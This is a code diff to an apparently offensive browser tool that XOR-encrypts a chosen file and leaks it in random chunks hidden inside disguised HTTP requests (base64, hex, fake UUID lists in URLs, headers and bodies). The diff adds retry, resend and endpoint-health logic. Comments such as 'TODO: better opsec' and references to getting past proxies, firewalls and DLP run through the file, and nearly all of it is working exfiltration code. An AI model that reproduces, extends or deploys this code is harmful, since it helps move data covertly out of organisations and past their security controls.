@@ -1,3 +1,17 @@
+// This controls how many times the system can recurse upon encountering an error.
+const MAX_DEPTH = 8;
+
+// This controls a ratio for deciding whether to continue/stop after an error.
+// If the # of errored endpoints is less than this value, keep going. For
+// example, if there are 8 endpoints and a ratio of 0.5, then the loop will
+// recurse even if it encounters errors in 1, 2, 3, or 4 endpoints. An
+// "endpoint" refers to the different (method, url) pairs defined in the
+// profile. A higher ratio means higher confidence that other requests will be
+// able to share the burden of the errored endpoints.
+const IGNORE_ERRORS_WHEN_FAIL_BELOW_RATIO = 0.26;
+
+const PATTERN_NAMES = ['chunkNo', 'currentIndex', 'finalIndex', 'retries', 'filename', 'checksum'];
+
 const profdata = document.getElementById('profdata').textContent.trim();
 if (!profdata) {
     throw new Error("no profdata available");
@@ -37,10 +51,42 @@ function bytesToHexString(bytes) {
     .join('');
 }
 
+function djb2(uint8Array) {
+  let hash = 5381;
+  for (let i = 0; i < uint8Array.length; i++) {
+    // hash * 33 + c
+    hash = ((hash << 5) + hash) + uint8Array[i];
+  }
+  // Ensure 32-bit unsigned integer
+  return hash >>> 0;
+}
+
+function str2u8(s) {
+    return new TextEncoder().encode(s);
+}
+
+class XorEncryptor {
+    constructor(key) {
+        this.key = str2u8(key);
+    }
+
+    encrypt(data) {
+        const result = new Uint8Array(data.length);
+        for (let i = 0; i < data.length; i++) {
+            result[i] = data[i] ^ this.key[i % this.key.length];
+        }
+        return result;
+    }
+}
+
 class PayloadTransformer {
+    /**
+     * @param {Uint8Array} payload 
+     * @param {Function} encryptor 
+     */
     constructor(payload) {
-        // Payload in Uint8Array.
         this.payload = payload;
+        // this.encryptor = encryptor ?? { encrypt(x, i) { return x; } };
         this.index = 0;
     }
 
@@ -48,17 +94,27 @@ class PayloadTransformer {
         return this.index >= this.payload.length;
     }
 
-    // next(nLo, nHi) {
-    //     const rand = (nLo === nHi || !nHi) ? nLo : randomLoHi(nLo, nHi);
-    //     this.index += rand;
-    //     const buf = payload.subarray(this.index - rand, this.index);
-    //     return buf;
-    // }
+    hash(from, to) {
+        const buf = this.payload.subarray(from, to);
+        return djb2(buf);
+    }
+
+    subarray(from, to) {
+        if (from >= to) {
+            throw new Error(`unexpected payload subrange ${from}-${to}`);
+        }
+        return new PayloadTransformer(this.payload.subarray(from, to));
+    }
+
     next(nLo, nHi) {
         const rand = (nLo === nHi || !nHi) ? nLo : randomLoHi(nLo, nHi);
         const remaining = this.payload.length - this.index;
         const take = Math.min(rand, remaining);
-        const buf = this.payload.subarray(this.index, this.index + take);
+        let buf = this.payload.subarray(this.index, this.index + take);
+        // buf = this.encryptor.encrypt(buf, nLo);
+        if (buf.length !== take) {
+            throw new Error(`encryption did not return same length of buffer`);
+        }
         this.index += take;
         if (take === rand) {
             return buf;
@@ -87,9 +143,10 @@ class PayloadTransformer {
 
 class VarGenerator {
     constructor(vars) {
+        vars = vars ?? [];
         this.generators = {};
-        for (const var_ of Object.keys(vars)) {
-            const schema = vars[var_];
+        for (const schema of vars) {
+            const name = schema.name;
             let gen = () => "";
             if (schema.type === "cycle") {
                 gen = (() => {
@@ -107,16 +164,16 @@ class VarGenerator {
             } else {
                 throw `expected valid var.{var}.type, but got ${schema.type}`;
             }
-            this.generators[var_]  = gen;
+            this.generators[name]  = gen;
         }
     }
 
-    hasVariable(var_) {
-        return Object.keys(this.generators).includes(var_);
+    hasVariable(name) {
+        return Object.keys(this.generators).includes(name);
     }
 
-    generate(var_) {
-        return this.generators[var_]();
+    generate(name) {
+        return this.generators[name]();
     }
 }
 
@@ -125,10 +182,10 @@ class Sequence {
         this.seq = seq;
     }
 
-    generate() {
+    generate(ctx) {
         let out = "";
         for (const f of this.seq)
-            out += f();
+            out += f.call(ctx);
         return out;
     }
 }
@@ -137,7 +194,7 @@ class PayloadGenerator {
     constructor({ vgenerator, payloader }) {
         this.vgenerator = vgenerator;
         this.payloader = payloader;
-        this.regex = /(\$\{(?:var|uuid|b64|hex)(?::[a-zA-Z0-9]+)?(?::[0-9]+)?\})/g;
+        this.regex = /(\$\{(?:var|uuid|uuidlist|b64|hex)(?::[a-zA-Z0-9]+)?(?::[0-9]+)?\})/g;
     }
 
     build(s) {
@@ -178,7 +235,7 @@ class PayloadGenerator {
             if (args.length !== 0) {
                 return `expected 0 args, got ${args.length}`;
             }
-        } else if (tag === 'b64' || tag === 'hex') {
+        } else if (tag === 'b64' || tag === 'hex' || tag === 'uuidlist') {
             if (args.length < 1 || args.length > 2) {
                 return `expected 1-2 args, got ${args.length}`;
             } else if (Number.isNaN(Number(args[0]))) {
@@ -199,13 +256,26 @@ class PayloadGenerator {
             if (!this.vgenerator.hasVariable(args[0])) {
                 throw new Error(`no such variable: ${args[0]}`)
             }
-            return () => this.vgenerator.generate(...args);
+            return function() { return this.vgenerator.generate(...args) };
         } else if (tag === 'uuid') {
-            return () => this.payloader.nextUuid(...args);
+            return function() { return this.payloader.nextUuid() };
+        } else if (tag === 'uuidlist') {
+            return function() {
+                let out = '[';
+                const n = (!args[1] || args[0] === args[1]) ? args[0] : randomLoHi(args[0], args[1]);
+                for (let i = 0; i < n; i++) {
+                    out += `"${this.payloader.nextUuid()}"`;
+                    if (i + 1 < n) {
+                        out += ',';
+                    }
+                }
+                out += ']';
+                return out;
+            };
         } else if (tag === 'b64') {
-            return () => this.payloader.nextB64(...args);
+            return function() { return this.payloader.nextB64(...args) };
         } else if (tag === 'hex') {
-            return () => this.payloader.nextHex(...args);
+            return function() { return this.payloader.nextHex(...args) };
         } else {
             throw new Error(`unexpected tag: ${tag}`);
         }
@@ -224,13 +294,15 @@ class PayloadGenerator {
 }
 
 class Request {
-    constructor(gen, { url, method, headers, body, repeat }) {
+    constructor(gen, { url, method, headers, body, repeat, on }) {
         let bytes, expectedBytes = 0;
         [this.url, bytes] = gen.build(url);
         expectedBytes += bytes;
         
         this.method = method ?? 'GET';
+        this.key = `${this.method}_${url}`;
         this.headers = [];
+        headers = headers ?? {};
         for (const [k, v] of Object.entries(headers)) {
             const [payload, bytes] = gen.build(v);
             this.headers.push([k, payload]);
@@ -246,21 +318,91 @@ class Request {
 
         this.repeat = repeat ? () => randomLoHi(...repeat) : () => 0;
         this.expectedBytes = expectedBytes;
+        
+        on = on ?? [];
+        this.onMapping = this._buildActions(on);
     }
 
-    generate(common) {
+    _buildActions(on) {
+        const onMapping = {};
+        const seenActions = [];
+
+        for (const rule of on) {
+            if (!rule.action) {
+                throw new Error(`expected [request].on.action field`);
+            }
+            
+            let status = rule.status;
+            if (!status) {
+                throw new Error(`expected [request].on.status field`);
+            }
+
+            if (Number.isInteger(status)) {
+                status = [status];
+            }
+            else if (Array.isArray(status) && status.every(Number.isInteger)) {
+                // pass
+            }
+            else {
+                throw new Error(`invalid type for [request].on.status`);
+            }
+
+            for (const s of status) {
+                onMapping[s] = rule;
+            }
+
+            const action = rule.action.toLowerCase();
+            seenActions.push(action);
+        }
+
+        // Pre-fill default actions
+        if (!seenActions.includes("ok")) {
+            // No user-defined ok action? => 200
+            onMapping[200] = {
+                status: [200],
+                action: "ok",
+            };
+        }
+        if (!seenActions.includes("error")) {
+            // No user-defined error action? => 400
+            onMapping[400] = {
+                status: [400],
+                action: "error",
+            };
+        }
+        if (!seenActions.includes("retry")) {
+            // No user-defined retry action? => 429
+            onMapping[429] = {
+                status: [429],
+                action: "retry",
+            };
+        }
+        
+        // Reserved status.
+        onMapping[502] = {
+            status: [502],
+            action: "sserror",
+        };
+        return onMapping;
+    }
+
+    matchActionFromStatus(status) {
+        return this.onMapping[status]?.action ?? null;
+    }
+
+    generate(ctx, common) {
         const { headers } = common;
-        // Sort headers before generating.
+        // Sort headers before generating. This is super important to maintain ordering.
         const sortedHeaders = [...headers, ...this.headers].sort(([a, _1], [b, _2]) => a.localeCompare(b, undefined, { sensitivity: 'base' }))
         // Return fetch arguments.
         return [
-            this.url.generate(),
+            this.url.generate(ctx),
             {
                 method: this.method,
                 headers: Object.fromEntries([
-                    ...sortedHeaders.map(([k, v]) => [k, `${v.generate()}`]),
+                    ...sortedHeaders.map(([k, v]) => [k, `${v.generate(ctx)}`]),
                 ]),
-                body: this.body ? this.body.generate() : undefined,
+                body: this.body ? this.body.generate(ctx) : undefined,
                 // "mode": "no-cors",
                 // "credentials": "include",
             },
@@ -270,6 +412,12 @@ class Request {
 
 function delay(ms) {
     return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+function nextFrame() {
+  return new Promise(resolve => {
+    requestAnimationFrame(resolve);
+  });
 }
 
 class IntermittentRequest extends Request {
@@ -293,33 +441,6 @@ function addPattern(url, options, pattern, state) {
     return [url, options];
 }
 
-async function actualSend(req, common, patterns, state) {
-    let [url, options] = req.generate(common);
-    state.finalIndex = state._finalIndex();
-
-    // Add state patterns.
-    for (const x of ['chunkNo', 'currentIndex', 'finalIndex', 'maxRetries', 'fnRev']) {
-        if (patterns[x] !== undefined && state[x] !== undefined) {
-            [url, options] = addPattern(url, options, patterns[x], state[x]);
-        }
-    }
-
-    let actualRetry = 20, backoff = 1000;
-    while (--actualRetry) {
-        try {
-            const resp = await fetch(url, options);
-            if (!resp)
-                throw new Error(`resp is ${resp}`);
-            return resp;
-        } catch (e) {
-            // Retry on (network) error, but wait a bit first.
-            console.error(`fetch error: ${e}, trying again in ${backoff}ms, ${actualRetry} retries left`);
-            await delay(backoff);
-            backoff = Math.min(backoff * 2, 60000); // At most 1min between waits.
-        }
-    }
-}
-
 class SequencedRequest {
     constructor(gen, requests, count, delay, maxRetries) {
         this.count = count ? (() => randomLoHi(...count)) : () => 1;
@@ -328,46 +449,16 @@ class SequencedRequest {
         this.requests = requests.map(r => new Request(gen, r));
     }
 
-    async sendOneWithRetry(req, reqr) {
-        let retries = this.maxRetries;
-        while (true && retries >= 0) {
-            if (reqr.finished())
-                return;
-
-            console.log(`>--> sequenced, chunk #${reqr.chunkNo}`);
-            const state = {
-                ...reqr.getState(),
-                maxRetries: retries,
-            };
-            reqr.chunkNo++;
-            retries -= 1;
-            const resp = await actualSend(req, reqr.common, reqr.patterns, state);
-            reqr.updateProgress();
-            if (resp.status === 304) {
-                // Sleep at most 100.
-                await delay(Math.min(100, this.delay()));
-                continue;
-            }
-            await delay(this.delay());
-            if (resp.ok) {
-                return; // Yippee!
-            } else {
-                throw new Error(`unexpected status code: ${resp.status}`);
-            }
-        }
-    }
-
-    async sendMany(reqr) {
+    async sendSequence(reqr) {
         let nCount = this.count();
         let req_index = 0;
         while (nCount > 0) {
-            if (reqr.finished())
-                return;
-
             const req = this.requests[req_index];
             const repeat = req.repeat();
             for (let i = 0; i < repeat + 1; i++) {
-                await this.sendOneWithRetry(req, reqr);
+                if (reqr.finished())
+                    return;
+                await reqr.sendWithRetry(req, { maxRetries: this.maxRetries, delay: this.delay });
                 nCount--;
                 if (nCount <= 0)
                     return;
@@ -378,28 +469,54 @@ class SequencedRequest {
 }
 
 class Requester {
-    constructor({ payloader, generator, patterns, intermittent, cycle, common, filename }) {
+    constructor({ payloader, generator, patterns, intermittent, cycle, common, filename, byteOffset, actualLength, depth }) {
         this.payloader = payloader;
         this.generator = generator;
-        this.filename = filename;
-        this.common = { headers: [] };
-        for (const hdr of Object.keys(common.headers)) {
-            this.common.headers[hdr] = this.generator.build(common.headers[hdr]);
-        }
         this.patterns = patterns;
+        this.intermittent = intermittent;
+        this.cycle = cycle;
+        this.common = common ?? null;
+        this.filename = filename;
         this.chunkNo = 0;
         this.running = false;
-
-        if (!Array.isArray(intermittent)) {
-            throw `expected intermittent to be Array, got ${typeof intermittent}`;
-        }
-        if (!Array.isArray(cycle)) {
-            throw `expected cycle to be Array, got ${typeof cycle}`;
-        }
-        this.intermittent = intermittent.map(x => new IntermittentRequest(x.every, this.generator, x.req));
-        this.cycle = cycle.map(c => new SequencedRequest(this.generator, c.req, c.count, c.delay, c.maxRetries))
-        this.onprogress = () => {};
+        this.health = new HealthTracker({
+            minSuccessRatio: 0.6,
+            historySize: 12,
+        });
+        this.byteOffset = byteOffset ?? 0; // For situations where we need to send a buffer at an offset.
+        this.actualLength = actualLength ?? this.payloader.payload.length;
+        this.depth = depth ?? 0;
+        // this.onprogress = () => {};
         this.startIntermittent();
+    }
+    
+    static make({ payloader, generator, patterns, intermittent, cycle, common, filename }) {
+        const _common = { headers: [] };
+        if (common) {
+            for (const hdr of Object.keys(common.headers)) {
+                _common.headers[hdr] = generator.build(common.headers[hdr]);
+            }
+        }
+        if (!intermittent) {
+            intermittent = [];
+        }
+        if (!cycle) {
+            cycle = [];
+        }
+        if (cycle.length === 0 && intermittent.length === 0) {
+            throw new Error(`expected cycle or intermittent to be non-empty`);
+        }
+        intermittent = intermittent.map(x => new IntermittentRequest(x.every, generator, x.req));
+        cycle = cycle.map(c => new SequencedRequest(generator, c.req, c.count, c.delay, c.maxRetries))
+        return new Requester({
+            payloader,
+            generator,
+            patterns,
+            intermittent,
+            cycle,
+            common: _common,
+            filename,
+        });
     }
 
     startIntermittent() {
@@ -409,23 +526,12 @@ class Requester {
                 if (this.finished())
                     return;
                 console.log(`>--> intermittent, chunk #${this.chunkNo}`);
-                const state = this.getState();
                 this.chunkNo++;
-                await actualSend(iRequest, this.common, this.patterns, state);
-                this.updateProgress();
+                await this.sendWithRetry(iRequest);
                 setTimeout(iRecursive.bind(this), iRequest.every());
             }
             setTimeout(iRecursive.bind(this), iRequest.every());
         }
-    }
-
-    getState() {
-        return {
-            chunkNo: this.chunkNo,
-            currentIndex: this.payloader.index,
-            _finalIndex: () => this.payloader.index, // Will be computed later
-            fnRev: this.filename.split('').reverse().join(''), // TODO: opsec
-        };
     }
 
     finished() {
@@ -433,10 +539,173 @@ class Requester {
     }
 
     updateProgress() {
-        self.onprogress(this.chunkNo, this.payloader.index, this.payloader.payload.length, this.startTime);
+        // this.onprogress(this.chunkNo, this.byteOffset + this.payloader.index, this.actualLength, this.startTime);
+        const index = this.byteOffset + this.payloader.index;
+        const length = this.actualLength;
+        const elapsedTime = Date.now() - this.startTime;
+        const eta = new Date(this.startTime + elapsedTime / (index / length));
+        window.updateUploadProgress({
+            percent: 100 * index / length,
+            loaded: index,
+            total: length,
+            eta: `${formatRelativeTime(eta)} (${eta.toTimeString()})`,
+        })
+    }
+
+    async send(req, state) {
+        state = {
+            ...state,
+            chunkNo: this.chunkNo,
+            currentIndex: this.byteOffset + this.payloader.index,
+            filename: this.filename.split('').reverse().join(''), // TODO: better opsec
+        };
+        let [url, options] = req.generate(this.generator, this.common);
+        state.finalIndex = this.byteOffset + this.payloader.index;
+        state.checksum = this.payloader.hash(state.currentIndex - this.byteOffset, state.finalIndex - this.byteOffset);
+
+        // Add state patterns.
+        for (const x of PATTERN_NAMES) {
+            if (this.patterns[x] !== undefined && state[x] !== undefined) {
+                [url, options] = addPattern(url, options, this.patterns[x], state[x]);
+            }
+        }
+
+        let actualRetry = 10, backoff = 1000;
+        while (--actualRetry) {
+            try {
+                const resp = await fetch(url, options);
+                if (!resp)
+                    throw new Error(`resp is ${resp}`);
+                return [resp, state];
+            } catch (e) {
+                // Retry on (network) error, but wait a bit first.
+                console.error(`fetch error: ${e}, trying again in ${backoff}ms, ${actualRetry} retries left`);
+                await delay(backoff);
+                backoff = Math.min(backoff * 2, 60000); // At most 1min between waits.
+            }
+        }
+    }
+
+    /**
+     * @param {Request} req
+     * @param {Object} [opts]
+     * @param {number} [opts.maxRetries=0]   - Maximum number of "retries"
+     * @param {number} [opts.delay]          - RNG function, to generate a number of milliseconds to delay
+     */
+    async sendWithRetry(req, opts) {
+        const recentHealth = this.health.getRecentHealth(req.key);
+        if (recentHealth.numRecent >= Math.min(5, this.health.historySize)
+            && recentHealth.recentSuccessLoad === 0)
+        {
+            // It's been failing the past N requests. Skip this request
+            // completely. Effectively, this means we remove it from the pool of
+            // available requests to send, which may lengthen the upload time.
+            console.log(`Skipping request ${req.key} due to too many failures.`);
+            return;
+        }
+
+        const { maxRetries, delay: delayf } = opts ?? {};
+        let retries = maxRetries ?? 0;
+        while (retries >= 0) {
+            if (this.finished())
+                return;
+
+            console.log(`>--> sequenced, chunk #${this.chunkNo}`);
+            this.chunkNo++;
+            const [resp, finalState] = await this.send(req, { retries });
+            this.updateProgress();
+            retries -= 1;
+            
+            const bytesInPayload = finalState.finalIndex - finalState.currentIndex;
+            const semanticAction = req.matchActionFromStatus(resp.status);
+            console.log(`${req.key} / chunk#${finalState.chunkNo}, #bytes=${bytesInPayload}, status=${resp.status}, action --> ${semanticAction}`);
+            if (semanticAction === "retry") {
+                this.health.registerState(req.key, bytesInPayload, true);
+                if (delayf) await delay(Math.min(randomLoHi(50, 200), delayf()));
+                continue;
+            } else if (semanticAction === "ok") {
+                this.health.registerState(req.key, bytesInPayload, true);
+                if (delayf) await delay(delayf());
+                return; // Sending done.
+            } else if (semanticAction === "sserror") {
+                // This should not normally happen within a normal program.
+                // Break off if a server-side error occurred.
+                console.error(`a server-side error occurred: ${resp.status}, chunk ${finalState.chunkNo}`);
+                this.stop();
+                if (delayf) await delay(delayf());
+                return;
+            } else if (semanticAction === "error" || true /* else */) {
+                if (semanticAction !== "error") {
+                    // Likely Proxy, firewall, DLP.
+                    console.error(`unexpected status code: ${resp.status}, chunk ${finalState.chunkNo}`);
+                }
+                if (delayf) await delay(delayf());
+
+                // Compute verdict before registering this failure data. We want
+                // to make the resend decision based on the past.
+                const verdict = this.health.queryContinue();
+                this.health.registerState(req.key, bytesInPayload, false);
+                console.log(`resend? verdict=${verdict}`);
+                if (verdict) {
+                    await this.handleSendFailAndResend(finalState);
+                    // TODO: currently there is NO way to know if the resend worked
+                } else {
+                    await this.handleSendFailAndGiveUp(finalState);
+                }
+            }
+        }
+    }
+
+    async handleSendFailAndResend(state) {
+        const resendPayloader = this.payloader.subarray(state.currentIndex, state.finalIndex);
+        const reqr = new Requester({
+            payloader: resendPayloader,
+            generator: new PayloadGenerator({
+                vgenerator: this.generator.vgenerator,
+                payloader: resendPayloader,
+            }),
+            patterns: this.patterns,
+            intermittent: this.intermittent,
+            cycle: this.cycle,
+            common: this.common,
+            filename: this.filename,
+            byteOffset: state.currentIndex,
+            actualLength: this.actualLength,
+            depth: this.depth + 1,
+        });
+        // reqr.onprogress = this.onprogress;
+
+        // TODO: make this non-recursive to avoid potential stack overflows, although the chances of that are probably slim
+        try {
+            // TODO: using await here is intended, so that it runs "in the same
+            // thread" as the current requests. However, other "threads" will still continue firing.
+            // For example, if we are inside the sequenced requests, intermittent requests will continue firing.
+            // Or if we are inside an intermittent request, sequenced requests will continue firing. 
+            await reqr.loop();
+        } catch (e) {
+            // Didn't work? Let's just stop.
+            this.stop();
+            console.error(`hard stop (depth: ${this.depth})`);
+            if (this.depth === 0) {
+                await this.handleSendFailAndGiveUp();
+            }
+            // throw new Error("hard stop"); // Stop any other parent resends.
+        }
+    }
+
+    async handleSendFailAndGiveUp(state) {
+        console.error(`Error: send failure`);
+        console.error(state);
+        window.statusError(`fail`);
+        this.stop();
+        debugger;
     }
 
     async loop() {
+        if (this.depth >= MAX_DEPTH) {
+            throw new Error(`forcing stop after ${MAX_DEPTH} recursive iterations`);
+        }
+
         // TODO: save and restore progress from local storage
         this.startTime = Date.now();
         this.running = true;
@@ -445,7 +714,7 @@ class Requester {
             const stage = this.cycle[stageIndex];
             console.log(`stage #${stageIndex+1}/${this.cycle.length}, chunk #${this.chunkNo}`);
             
-            await stage.sendMany(this);
+            await stage.sendSequence(this);
             stageIndex = (stageIndex + 1) % this.cycle.length;
         }
     }
@@ -459,8 +728,184 @@ class Requester {
     }
 }
 
-const elStatus = document.getElementById('status');
-const elTask = document.getElementById('task');
+/**
+ * Tracks success/failure using fixed-size per-key history (no timestamps).
+ * Load is accumulated forever per key for overall weight tracking.
+ * Recent performance is judged only from the fixed-size recent operations buffer.
+ */
+class HealthTracker {
+  /**
+   * @param {Object} [options]
+   * @param {number} [options.minSuccessRatio=0.4]     - Minimum weighted success ratio in recent window
+   * @param {number} [options.historySize=12]          - Fixed number of recent operations kept per key
+   */
+  constructor(options = {}) {
+    this.minSuccessRatio = options.minSuccessRatio ?? 0.4;
+    this.historySize = options.historySize ?? 12;
+
+    // key → { totalLoad: number, successLoad: number, recent: Array<{load: number, success: boolean}> }
+    // recent is a circular buffer (fixed max length)
+    this.tracked = new Map();
+  }
+
+  /**
+   * Register an operation result
+   * @param {string} key       - Identifier (e.g. "upload-chunk", "api-/users")
+   * @param {number} load      - Weight/importance (positive integer)
+   * @param {boolean} success  - Whether it succeeded
+   */
+  registerState(key, load, success) {
+    if (!Number.isInteger(load) || load < 0) {
+      throw new Error("load must be a positive integer");
+    }
+
+    if (!this.tracked.has(key)) {
+      this.tracked.set(key, {
+        totalLoad: 0,
+        successLoad: 0,
+        recent: [],                   // acts as circular buffer
+        nextIndex: 0
+      });
+    }
+
+    const entry = this.tracked.get(key);
+
+    // Accumulate total lifetime load (never reset)
+    entry.totalLoad += load;
+    if (success) {
+      entry.successLoad += load;
+    }
+
+    // Manage fixed-size recent history (circular overwrite)
+    const hist = entry.recent;
+
+    if (hist.length < this.historySize) {
+      // Still filling up
+      hist.push({ load, success });
+    } else {
+      // Overwrite oldest entry
+      hist[entry.nextIndex] = { load, success };
+      entry.nextIndex = (entry.nextIndex + 1) % this.historySize;
+    }
+  }
+
+  /**
+   * @param {string} key 
+   * @returns {{load, success} | null}
+   */
+  getMostRecentEntry(key) {
+    const entry = this.tracked.get(key) ?? null;
+    if (!entry)
+        throw new Error(`no such entry: ${key}`);
+    this.#getMostRecentItemFromEntry(entry);
+  }
+
+  #getMostRecentItemFromEntry(entry) {
+    if (entry.recent.length < this.historySize) {
+        return entry.recent[entry.recent.length - 1];
+    } else {
+        const lastIndex = (entry.nextIndex + this.historySize - 1) % this.historySize;
+        return entry.recent[lastIndex];
+    }
+  }
+
+  /**
+   * Decide whether to continue operations based on **recent** weighted success rate.
+   * Looks only at the fixed-size history per key, aggregates across all keys.
+   * Returns `true` if overall recent weighted success ≥ minSuccessRatio.
+   * Returns `false` if too many recent failures (weighted).
+   * If no recent data at all → returns `true` (fail-open).
+   *
+   * @returns {boolean}
+   */
+  queryContinue() {
+    let globalRecentTotalLoad = 0;
+    let globalRecentSuccessLoad = 0;
+    let totalCount = 0;
+    let failCount = 0;
+
+    // Question: How many API endpoints are still successful?
+    for (const entry of this.tracked.values()) {
+        totalCount++;
+        if (entry.recent.length === 0) {
+            // Treat as succeeded.
+            continue;
+        }
+        const { load, success } = this.#getMostRecentItemFromEntry(entry);
+        if (!success)
+            failCount++;
+        
+        for (const op of entry.recent) {
+            globalRecentTotalLoad += op.load;
+            if (op.success) {
+                globalRecentSuccessLoad += op.load;
+            }
+        }
+    }
+
+    const ratio = globalRecentSuccessLoad / globalRecentTotalLoad;
+    console.log(`queryContinue: succ=${totalCount-failCount}/${totalCount}, load=${globalRecentSuccessLoad}/${globalRecentTotalLoad}, ratio=${Math.floor(ratio * 100)}%`)
+
+    // When global byte transfer is low, we just allow continuing. This provides
+    // some leeway for the first few requests, since there may not have been not
+    // much transfer going on.
+    if (failCount <= IGNORE_ERRORS_WHEN_FAIL_BELOW_RATIO * totalCount) {
+      return true;
+    }
+
+    return ratio >= this.minSuccessRatio;
+  }
+
+  /**
+   * Get diagnostic info for a specific key
+   * @param {string} key
+   * @returns {{globalRecentRatio: number, recentTotalLoad: number, recentSuccessLoad: number, minRequired: number}}
+   */
+  getRecentHealth(key) {
+    let recentTotalLoad = 0;
+    let recentSuccessLoad = 0;
+
+    const entry = this.tracked.get(key) ?? { recent: [] };
+    for (const op of entry.recent) {
+        recentTotalLoad += op.load;
+        if (op.success) recentSuccessLoad += op.load;
+    }
+
+    return {
+        globalRecentRatio: recentTotalLoad > 0 ? recentSuccessLoad / recentTotalLoad : 1,
+        recentTotalLoad,
+        recentSuccessLoad,
+        numRecent: entry.recent.length,
+        minRequired: this.minSuccessRatio,
+    };
+  }
+
+  /**
+   * Get lifetime stats for a specific key (accumulated forever)
+   * @param {string} key
+   * @returns {{totalLoad: number, successLoad: number, lifetimeRatio: number}|null}
+   */
+  getLifetimeStats(key) {
+    const entry = this.tracked.get(key);
+    if (!entry) return null;
+
+    return {
+      totalLoad: entry.totalLoad,
+      successLoad: entry.successLoad,
+      lifetimeRatio: entry.totalLoad > 0 ? entry.successLoad / entry.totalLoad : 1,
+    };
+  }
+
+  /**
+   * Clear everything (for testing / reset)
+   */
+  reset() {
+    this.tracked.clear();
+  }
+}
+
+// const elStatus = document.getElementById('status');
+// const elTask = document.getElementById('task');
 
 const relativeTimeFormatter = new Intl.RelativeTimeFormat("en-US", { numeric: "auto" });
 
@@ -497,19 +942,6 @@ async function computeHash(alg, buffer) {
     return hashHex;
 }
 
-function onprogress(chunkNo, index, length, startTime) {
-    const elapsedTime = Date.now() - startTime;
-    const eta = new Date(startTime + elapsedTime / (index / length));
-    // const etaRelative = elapsedTime / (index / (length - index));
-    elStatus.textContent = (index === length ?
-      'Done!' :
-      `${Math.floor(100*index/length)}% ` +
-      `[${Math.floor(index/1024)} / ${Math.floor(length/1024)}KiB] ` +
-      `[${chunkNo+1} requests] ` +
-      `[eta: ${eta.toTimeString()}, ${formatRelativeTime(eta)}]`
-    );
-}
-
 const form = document.getElementsByTagName('form')[0];
 form.addEventListener('submit', async (e) => {
     e.preventDefault();
@@ -520,8 +952,30 @@ form.addEventListener('submit', async (e) => {
     const fileInput = document.getElementById('fileInput');
     const file = fileInput.files[0];
     
-    const buffer = new Uint8Array(await file.arrayBuffer());
+    let buffer = new Uint8Array(await file.arrayBuffer());
     console.log(`loaded ${buffer.length} bytes`)
+
+    let encryptor = null;
+    if (encryption) {
+        if (encryption.type === 'xor') {
+            if (!encryption.key) {
+                throw new Error(`empty encryption key`);
+            }
+            encryptor = new XorEncryptor(encryption.key);
+        } else {
+            throw new Error(`unknown encryption type: ${encryption.type}`);
+        }
+    }
+
+    const originalBuffer = buffer;
+    if (encryptor) {
+        console.log(`encrypting...`);
+        window.setStatus('encrypting...');
+        nextFrame();
+        buffer = encryptor.encrypt(buffer);
+        console.log(`encryption done!`);
+        window.clearStatus();
+    }
 
     const payloader = new PayloadTransformer(buffer);
     const vgenerator = new VarGenerator(vars);
@@ -535,19 +989,18 @@ form.addEventListener('submit', async (e) => {
     }
     const filename = fnSplat.join('.');
 
-    const sha1 = await computeHash('SHA-1', buffer);
-    const sha256 = await computeHash('SHA-256', buffer);
-    document.getElementById('task').textContent = `Uploading ${file.name}:`;
     if (!window.crypto.subtle) {
-        document.getElementById('sha1').textContent = `(http connection, unable to compute hash with subtlecrypto)`;
+        window.updateUploadProgress({ sha1: '(Unable to compute hash, no subtlecrypto, possibly due to unencrypted HTTP connection.)', sha256: '—' })
     } else {
-        document.getElementById('sha1').textContent = `sha1: ${sha1}`;
-        document.getElementById('sha256').textContent = `sha256: ${sha256}`;
+        const sha1 = await computeHash('SHA-1', originalBuffer);
+        const sha256 = await computeHash('SHA-256', originalBuffer);
+        window.updateUploadProgress({sha1, sha256});
     }
+    window.updateUploadProgress({ filename });
 
-    const reqr = new Requester({ payloader, generator, patterns, intermittent, cycle, common, filename });
+    const reqr = Requester.make({ payloader, generator, patterns, intermittent, cycle, common, filename });
     window.activeRequester = reqr;
-    reqr.onprogress = onprogress;
+    nextFrame();
     reqr.loop();
 });
 form.addEventListener('reset', async (e) => {
